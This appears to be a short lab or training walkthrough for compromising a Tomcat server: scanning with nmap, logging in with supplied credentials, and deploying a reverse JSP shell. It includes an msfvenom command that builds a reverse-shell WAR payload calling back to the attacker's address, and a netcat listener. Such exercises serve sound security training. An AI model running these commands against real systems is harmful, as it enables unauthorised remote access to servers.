Part 1 - Find tomcat
- use nmap, with default option and -sV to find the Tomcat server running

Part 2 - Log in
- nikto can easily find the credentials but to save you time the username/password is: tomcat/gibson. WARNING: Please do not brute force this account as it will automatically lock everyone out. 

Part 3 - Get a reverse shell:
- using metasploit generate a reverse JSP shell:
- msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell_<userid>.war
- Listen with netcat: nc -lvp <port>
